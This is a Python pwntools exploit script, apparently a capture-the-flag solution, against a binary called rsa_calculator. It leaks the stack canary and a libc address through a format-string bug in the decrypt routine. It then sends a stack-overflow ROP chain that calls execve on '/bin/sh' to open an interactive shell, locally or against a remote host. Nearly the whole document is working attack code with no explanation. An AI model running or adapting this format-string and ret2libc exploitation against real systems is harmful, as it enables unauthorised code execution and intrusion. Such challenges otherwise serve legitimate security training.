from pwn import *
context(os="linux", arch="amd64", kernel="amd64")

if args.DEBUG:
    context.log_level="debug"

g_fname = args.FNAME if args.FNAME else './rsa_calculator'
g_bin = ELF(g_fname)

g_libcname = args.LIBC if args.LIBC else '/lib/x86_64-linux-gnu/libc.so.6'
g_lib = ELF(g_libcname)

if (args.REMOTE):
    host, port = args.REMOTE.split(':')
    g_io = remote(host, int(port))
else:
    g_io = process(g_fname)

def opt(idx):
    g_io.sendlineafter(b'> ', str(idx).encode())

def set_key_pair():
    opt(1)
    g_io.sendlineafter(b'p : ', b'17')
    g_io.sendlineafter(b'q : ', b'19')
    g_io.sendlineafter(b'e : ', b'13')
    g_io.sendlineafter(b'd : ', b'133')

def encrypt(plain_text):
    opt(2)
    g_io.sendlineafter(b') : ', str(len(plain_text)).encode())
    g_io.sendlineafter(b'data\n', plain_text)
    g_io.recvuntil(b') -\n', drop=False)
    ciphered_text = g_io.recvline(keepends=False)
    log.info('Ciphered text: %s' % ciphered_text)
    return ciphered_text

def decrypt(ciphered_text, size=0):
    opt(3)
    if (size == 0):
        g_io.sendlineafter(b') : ', str(len(ciphered_text)).encode())
    else:
        g_io.sendlineafter(b') : ', str(size).encode())
    g_io.sendlineafter(b'data\n', ciphered_text)
    g_io.recvuntil(b' -\n')
    data = g_io.recvline(keepends=False)
    log.info('Decrypted text: %s' % data)
    return data


def leak_addr_in_got(got, name):
    en_data = encrypt(b'/bin/sh;%25$s')
    payload = en_data + p64(got)
    de_data = decrypt(payload)[8:]
    addr = u64(de_data.ljust(8, b'\x00'))
    log.success('%s@%#x' % (name, addr))
    return addr

def leak_canary():
    off_canary = 205
    en_data = encrypt(b'%205$p')
    de_data = decrypt(en_data)
    canary = int(de_data, 16)
    log.success('Canary=%#x' % canary)
    return canary

def pwn():
    set_key_pair()

    off_ciphered_input = 12

    # leak canary
    canary = leak_canary()

    # leak_addr_in_got(g_bin.got['__libc_start_main'], '__libc_start_main')
    # leak_addr_in_got(g_bin.got['fgetc'], 'fgetc')
    # leak_addr_in_got(g_bin.got['setvbuf'], 'setvbuf')
    libc_base = leak_addr_in_got(g_bin.got['putchar'], 'putchar') - g_lib.sym['putchar']
    log.success("libc@%#x" % libc_base)
    g_lib.address = libc_base

    pause()

    # constraints:
    #   [rsp+0x30] == NULL
    ogg = 0x45226+libc_base

    # but when ret from RSA_decrypt, 
    # [rsp+0x30] != 0, but [rsp+0x40] == 0
    pop_ret = 0x401514
    pop_rdi = 0x21112 + libc_base


    en_bin_sh = b'ea000000a6000000a5000000a2000000ea00000073000000fd000000'
    addr_bin_sh = 0x602560
    rop_payload = flat([
        # 'z'*0x608,
        en_bin_sh.ljust(0x608, b'z'),
        canary,
        0xdeadbeef, # fake rbp
        pop_rdi, addr_bin_sh,
        g_lib.sym['execve']
    ])
    decrypt(rop_payload, -1)

if ('__main__' == __name__):
    pwn()
    g_io.interactive()